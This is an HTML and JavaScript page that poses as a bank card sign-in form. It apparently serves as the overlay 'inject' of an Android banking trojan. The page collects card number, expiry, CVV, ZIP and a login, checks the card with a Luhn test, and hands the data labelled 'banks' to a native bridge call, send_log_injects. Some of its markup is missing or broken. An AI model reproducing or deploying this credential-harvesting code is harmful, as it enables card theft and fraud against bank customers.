<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <style>
        #form1, #form2 {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        header {
            flex: 1;
        }

        footer {
            padding: 15px;
        }
        
        .cool-input {
            box-sizing: border-box;
            border: 0;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 10px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 1em;
        }
        .cool-input__input:focus {
            outline: none;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: 100%;
            position: absolute;
            z-index: 1;
            left:0;
            top: 50%;
            line-height: 0;
            color: #4c4951;
            font-weight: 600;
            transition: all 0.2s ease;
        }

        .cool-input__input_filled + .cool-input__placeholder,
        .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: -0.3em;
        }

        .cool-input__input:focus + .cool-input__placeholder {
            color: #4c4951;
        }

        .input {
            width: 100%;
            padding: 8px;
            border: 0;
            border-bottom: 1px solid #7f7f7f;
            padding-left: 0;
        }

        .input:focus {
            border-bottom: 2px solid #7f7f7f;
        }

        .error {
            border-color: #f00 !important;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }

        .button {
            width: 100%;
            background-color: #6d1ed4;
            color: #fff;
            border: 0;
            border-radius: 4px;
            padding: 10px;
            font-weight: 600;
            margin-top: 15px;
            margin-bottom: 15px;
        }

        .button:disabled {
            opacity: 0.4;
        }
    </style>
</head>

    </div>

            </header>
            <footer>
                <div class="cool-input">
                    <input type="tel" id="cc" name="cc" onkeyup="check6();check5()" class="input cool-input__input" autocomplete="off">
                    <span class="cool-input__placeholder">Credit Card</span>
                </div>
                <div>
                    <div class="cool-input" style="float: left; width: 48%;">
                        <input type="tel" id="exp" name="exp" onkeyup="check4();check5()" class="input cool-input__input" autocomplete="off">
                        <span class="cool-input__placeholder">EXP</span>
                    </div>
                    <div class="cool-input" style="float: right; width: 48%;">
                        <input type="password" id="cvv" name="cvv" onkeyup="check5()" class="input cool-input__input" autocomplete="off">
                        <span class="cool-input__placeholder">CVV</span>
                    </div>
                </div>
                
                <div class="cool-input" style="float: left;margin-top: 0;">
                    <input type="text" id="zip" name="zip" onkeyup="check5()" class="input cool-input__input" autocomplete="off">
                    <span class="cool-input__placeholder">ZIP</span>
                </div>

                <input type="submit" class="button" id="sendData" disabled value="SIGN IN">
            </footer>
        </div>
    </form>
    <script>
        $('#cc').mask('0000 0000 0000 0000');
        $('#exp').mask('00/00');
        $('#cvv').mask('000')
        $('#login').mask('0#')

        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });

        var spinner = document.getElementById('spinner'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2');

        var login = document.getElementById('login'),
            cc = document.getElementById('cc'),
            exp = document.getElementById('exp'),
            cvv = document.getElementById('cvv'),
            zip = document.getElementById('zip');

        var nextPage = document.getElementById('nextPage'),
            sendData = document.getElementById('sendData');

        login.onkeyup = () => {
            if(login.value.length > 6) {
                nextPage.disabled = false
            } else {
                nextPage.disabled = true
            }
        }

        nextPage.onclick = () => { 
            spinner.style.display = 'block';

            setTimeout(() => {
                spinner.style.display = 'none';

                form1.style.display = 'none'
                form2.style.display = 'flex'
            }, 2000);
        }

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
                return true
            }
        }

        function check4() {
            
            var mmYY = exp.value.split('/');
			var month = parseInt(mmYY[0]);
			var year = parseInt(mmYY[1]);
			var expArray = exp.value.split('/');
			var today, someday;
			var exMonth = expArray[0];
			var exYear = "20" + expArray[1];

			today = new Date();
			someday = new Date();
			someday.setFullYear(exYear, exMonth, 1);

            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function check5() {
            if(valid_credit_card(cc.value) && check4() == true && exp.value.length === 5 && cvv.value.length === 3 && zip.value.length > 2) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
        }

        sendData.onclick = () => {
            var data = {};
                data.login = login.value;
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.zip = zip.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
</body>
</html>
